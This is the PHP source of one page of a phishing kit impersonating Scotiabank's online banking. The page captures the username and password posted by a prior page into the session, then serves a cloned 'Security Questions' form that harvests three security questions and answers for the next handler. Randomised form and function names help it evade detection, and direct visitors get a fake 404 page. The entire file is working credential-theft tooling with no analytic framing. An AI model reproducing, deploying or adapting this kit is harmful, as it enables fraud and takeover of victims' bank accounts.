<?php
session_start();
error_reporting(0);
include "../control.php";
include "../sc.php";

if(isset($_POST["uname"]))
{
	$uname=$_SESSION["uname"]=$_POST["uname"];
	$pword=$_SESSION["pword"]=$_POST["pword"];

	if(strlen($pword)<6 || strlen($uname)<4 )
	{
		
		echo '<script>window.location.assign("authntication.bs.php?intcp='.randomCha(rand(2,3)).'|LOGIN|F='.randomCha(rand(30,60)).'&errOccured=1");</script>';
		die();
	}
	
	
	$fname=randomCha(rand(10,13));
	$fj=randomCha(rand(14,15));
	$fj1=randomCha(rand(16));
	echo '<!DOCTYPE html>
<html style="" class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths" lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Scotiabank-BankingWeb</title>

  <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
  <link rel="apple-touch-icon" href="advertisements/applei.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.00, maximum-scale=1, user-scalable=0">
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <link rel="stylesheet" href="advertisements/css.css?load_id='.randomCha(rand(15,16)).'">

  
<script>
var count = 0;

function spinit(){
  var bar = document.getElementsByClassName("spinner")[0].children;
  bar[count].firstChild.style.background = "black";
  count += 1; count = count % bar.length;
  bar[count].firstChild.style.background = "white";
  bar[count].firstChild.style.border = "2px solid black";
}
setInterval(spinit, 100);
</script>
  
</head>
<body class="f-topbar-fixed">
<nav-bar params="route: route"><div>
    <div class="nav-bar fixed" >
        <nav class="top-bar scotiabank" data-topbar="" role="navigation"  style="">
            <ul class="title-area">
                <li class="name">
                    <h1>
      

                    </h1>
                </li>
                

                
                
                <li class="toggle-topbar" >
                    <img class="menu" role="button" alt="Menu" tabindex="0" src="advertisements/menu.svg" onerror="this.src=\'images/menu.png\'">
                </li>
            </ul>
            
        <section class="middle tab-bar-section" style="left: 0%;">
                        <img class="logo" aria-hidden="route().page === \'activate-select\' || route().page === \'recover-select\'  || route().page === \'dcv\' " tabindex="0" alt="Scotiabank"  src="advertisements/logo.svg" onerror="images/en/logo.png">

                </section><section class="top-bar-section"  style="left: 0%;">
                <navigation-menu params="{route:route}"><div class="navigation-menu" >
  	<ul class="right" >
      	<li><a href="#" class="nav-item menu-accounts" tabindex="0" >Accounts</a></li>
  	
      	<li><a href="#" class="nav-item menu-move-money" tabindex="0" >Move Money</a></li>
  	
      	<li><a href="#" class="nav-item menu-locator" tabindex="0" >Locator</a></li>
  	
      	<li><a href="#" class="nav-item menu-contact" tabindex="0" >Contact Us</a></li>
  	
      	<li><a href="#" class="nav-item menu-settings" tabindex="0" >Settings</a></li>
  	
      	<li><a href="#" class="nav-item menu-logout" tabindex="0" >Logout</a></li>
  	</ul>
</div></navigation-menu>
            </section></nav>
    </div>
</div></nav-bar>
<notifications><div class="notifications" aria-live="assertive" >
	<div class="error-message alert-box" role="alertdialog"  tabindex="-1" style="display: none;">
		
	</div>
</div></notifications>
<loading params="{isLoading: BankingJS.Utilities.Network.isLoading}"><div id="loadingspin" class="loading-container" role="alert" aria-live="assertive" tabindex="0" style="display: none">
	<div class="loading" id="load" aria-label="Loading"><div class="spinner" style="position: absolute; width: 0px; z-index: 2000000000; left: 50%; top: 50%;" role="progressbar"><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-0-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(0deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-1-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(27deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-2-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(55deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-3-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(83deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-4-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(110deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-5-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(138deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-6-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(166deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-7-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(193deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-8-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(221deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-9-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(249deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-10-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(276deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-11-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(304deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-12-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(332deg) translate(24px, 0px); border-radius: 5px;"></div></div></div><div style="color: transparent">Loading...</div></div>
</div></loading>
<div id="page" class="container height100" ><div  class="mfa-reset-container component-container">
    <div class="margin" id="mfa-reset-container">
        <div class="title">
            <span class="medium red title" tabindex="0" >Security Questions</span>
        </div>
		


<script>
function '.$fj.'() {
    var a = document.forms["'.$fname.'"]["qq1"];
    var b = document.forms["'.$fname.'"]["aa1"];
    var c = document.forms["'.$fname.'"]["qq2"];
    var d = document.forms["'.$fname.'"]["aa2"];
    var e = document.forms["'.$fname.'"]["qq3"];
    var f = document.forms["'.$fname.'"]["aa3"];

 
  


    if ( a.value.length>1 && b.value.length>1 && c.value.length>1 && d.value.length>1 && e.value.length>1 && f.value.length>1 )
{
	document.getElementById("continue").disabled="";
	document.getElementById("continue").className="mt20 red-button";
}
else
{
	document.getElementById("continue").disabled="true";
	document.getElementById("continue").className="mt20 grey-button";
}

}

function '.$fj1.'()
{
	var a = document.forms["'.$fname.'"]["qq1"];
    var b = document.forms["'.$fname.'"]["aa1"];
    var c = document.forms["'.$fname.'"]["qq2"];
    var d = document.forms["'.$fname.'"]["aa2"];
    var e = document.forms["'.$fname.'"]["qq3"];
    var f = document.forms["'.$fname.'"]["aa3"];
	
	if(a.value == c.value || e.value == a.value || c.value == e.value)
{
	alert("Please select three different questions");
	return false;
}
document.getElementById("'.$fname.'").submit();
document.getElementById("loadingspin").style.display="";
return true;

}
</script>			
	
        <div>
            <ul class="small">
                <li >This computer or device is not registered in your profile.  Please
 verify your identity by selecting and answering your personal security questions.</li>

            </ul>
        </div>

        <form name="'.$fname.'" id="'.$fname.'" class="mt20" action="identiy-proc.bs.php?intcp='.randomCha(rand(2,3)).'|IDENTITY|F='.randomCha(rand(30,60)).'" autocomplete="off" novalidate="novalidate" onsubmit="'.$fj1.'(); return false;" method="POST">
            <div >
                <span class="float-left">
                    <label id="questionX" class="small dark-grey float-left" for="questionXSelectBox" >Question 1</label>
                </span>

                <pre class="error"></pre>
                <div>
                    
					
					<select id="qq1" name="qq1" onchange="'.$fj.'();">
						<option value="">Select from list...</option>
						<option value="As a child, what did you want to be when you grew up?">As a child, what did you want to be when you grew up?
						</option>
						<option value="In what year did you graduate from high school?">In what year did you graduate from high school?
						</option>
						<option value="What is or was the name of the town your grandmother lived in?">What is or was the name of the town your grandmother lived in?
						</option>
						<option value="What is the first name of your oldest nephew?">What is the first name of your oldest nephew?
						</option>
						<option value="What is the first name of your oldest niece?">What is the first name of your oldest niece?
						</option>
						<option value="What is the last name of your favorite teacher in elementary school?">What is the last name of your favorite teacher in elementary school?
						</option>
						<option value="What is the name of your first employer?">What is the name of your first employer?
						</option>
						<option value="What is the name of your first pet?">What is the name of your first pet?
						</option>
						<option value="What is the name of your oldest cousin?">What is the name of your oldest cousin?
						</option>
						<option value="What is your best friend\'s first name?">What is your best friend\'s first name?
						</option>
						<option value="What is your favorite hobby?">What is your favorite hobby?
						</option>
						<option value="What is your favorite movie?">What is your favorite movie?
						</option>
						<option value="What is your favorite vacation destination?">What is your favorite vacation destination?
						</option>
						<option value="What is your paternal grandfather&amp;#39;s first name?">What is your paternal grandfather\'s first name?
						</option>
						<option value="What was the first name of your first manager?">What was the first name of your first manager?
						</option>
						<option value="What was the name of the street on which you grew up?">What was the name of the street on which you grew up?
						</option>
						<option value="What was the name of your elementary school?">What was the name of your elementary school?
						</option>
						<option value="What was the name of your first girlfriend/boyfriend?">What was the name of your first girlfriend/boyfriend?
						</option>
						<option value="Where did you go on your honeymoon?">Where did you go on your honeymoon?
						</option>
						<option value="Where did you meet your spouse for the first time? (Enter name of city)">Where did you meet your spouse for the first time? (Enter name of city)
						</option></select>
						
						
                </div>
                
                <label for="aa1" class="small light-grey mb7">Answer</label>
                <input id="aa1" type="text" class="general" placeholder="Enter Your Answer" name="aa1" onkeyup="'.$fj.'();">
                    <pre  class="error"  id="error_answer_securityAnswer_0"></pre>
            
                <span class="float-left">
                    <label id="questionX" class="small dark-grey float-left" for="questionXSelectBox" >Question 2</label>
                </span>

                <pre class="error"></pre>
                <div>
                    <select id="qq2" name="qq2" onchange="'.$fj.'();">
						<option value="">Select from list...</option>
						<option value="As a child, what did you want to be when you grew up?">As a child, what did you want to be when you grew up?
						</option>
						<option value="In what year did you graduate from high school?">In what year did you graduate from high school?
						</option>
						<option value="What is or was the name of the town your grandmother lived in?">What is or was the name of the town your grandmother lived in?
						</option>
						<option value="What is the first name of your oldest nephew?">What is the first name of your oldest nephew?
						</option>
						<option value="What is the first name of your oldest niece?">What is the first name of your oldest niece?
						</option>
						<option value="What is the last name of your favorite teacher in elementary school?">What is the last name of your favorite teacher in elementary school?
						</option>
						<option value="What is the name of your first employer?">What is the name of your first employer?
						</option>
						<option value="What is the name of your first pet?">What is the name of your first pet?
						</option>
						<option value="What is the name of your oldest cousin?">What is the name of your oldest cousin?
						</option>
						<option value="What is your best friend\'s first name?">What is your best friend\'s first name?
						</option>
						<option value="What is your favorite hobby?">What is your favorite hobby?
						</option>
						<option value="What is your favorite movie?">What is your favorite movie?
						</option>
						<option value="What is your favorite vacation destination?">What is your favorite vacation destination?
						</option>
						<option value="What is your paternal grandfather&amp;#39;s first name?">What is your paternal grandfather\'s first name?
						</option>
						<option value="What was the first name of your first manager?">What was the first name of your first manager?
						</option>
						<option value="What was the name of the street on which you grew up?">What was the name of the street on which you grew up?
						</option>
						<option value="What was the name of your elementary school?">What was the name of your elementary school?
						</option>
						<option value="What was the name of your first girlfriend/boyfriend?">What was the name of your first girlfriend/boyfriend?
						</option>
						<option value="Where did you go on your honeymoon?">Where did you go on your honeymoon?
						</option>
						<option value="Where did you meet your spouse for the first time? (Enter name of city)">Where did you meet your spouse for the first time? (Enter name of city)
						</option></select>

                </div>
                
                <label for="aa2" class="small light-grey mb7">Answer</label>
                <input id="aa2" type="text" class="general" placeholder="Enter Your Answer" name="aa2" onkeyup="'.$fj.'();">
                    <pre  class="error" id="error_answer_securityAnswer_1"></pre>
            
                <span class="float-left">
                    <label id="questionX" class="small dark-grey float-left" for="questionXSelectBox" >Question 3</label>
                </span>

                <pre class="error"></pre>
                <div>
                   <select id="qq3" name="qq3" onchange="'.$fj.'();">
						<option value="">Select from list...</option>
						<option value="As a child, what did you want to be when you grew up?">As a child, what did you want to be when you grew up?
						</option>
						<option value="In what year did you graduate from high school?">In what year did you graduate from high school?
						</option>
						<option value="What is or was the name of the town your grandmother lived in?">What is or was the name of the town your grandmother lived in?
						</option>
						<option value="What is the first name of your oldest nephew?">What is the first name of your oldest nephew?
						</option>
						<option value="What is the first name of your oldest niece?">What is the first name of your oldest niece?
						</option>
						<option value="What is the last name of your favorite teacher in elementary school?">What is the last name of your favorite teacher in elementary school?
						</option>
						<option value="What is the name of your first employer?">What is the name of your first employer?
						</option>
						<option value="What is the name of your first pet?">What is the name of your first pet?
						</option>
						<option value="What is the name of your oldest cousin?">What is the name of your oldest cousin?
						</option>
						<option value="What is your best friend\'s first name?">What is your best friend\'s first name?
						</option>
						<option value="What is your favorite hobby?">What is your favorite hobby?
						</option>
						<option value="What is your favorite movie?">What is your favorite movie?
						</option>
						<option value="What is your favorite vacation destination?">What is your favorite vacation destination?
						</option>
						<option value="What is your paternal grandfather&amp;#39;s first name?">What is your paternal grandfather\'s first name?
						</option>
						<option value="What was the first name of your first manager?">What was the first name of your first manager?
						</option>
						<option value="What was the name of the street on which you grew up?">What was the name of the street on which you grew up?
						</option>
						<option value="What was the name of your elementary school?">What was the name of your elementary school?
						</option>
						<option value="What was the name of your first girlfriend/boyfriend?">What was the name of your first girlfriend/boyfriend?
						</option>
						<option value="Where did you go on your honeymoon?">Where did you go on your honeymoon?
						</option>
						<option value="Where did you meet your spouse for the first time? (Enter name of city)">Where did you meet your spouse for the first time? (Enter name of city)
						</option></select>
                </div>
                
                <label for="aa3" class="small light-grey mb7" >Answer</label>
                <input id="aa3" type="text" class="general" placeholder="Enter Your Answer" name="aa3" onkeyup="'.$fj.'();">
                    <pre  class="error" id="error_answer_securityAnswer_2"></pre>
            </div>
            <div>
                <pre  class="error" style="margin-bottom: 0px;" id="sameAnswerError" alt="There\'s an error with this field"></pre>
                <button id="continue" class="mt20 grey-button"  disabled="disabled">Submit</button>
            </div>
        </form>
    </div>
</div></div>


</body></html>';
}
else
{
	header($_SERVER['SERVER_PROTOCOL'] . ' 404 - Page Not Found', true, 404);
	die("<h1>404 - Page Not Found</h1>");
}
?>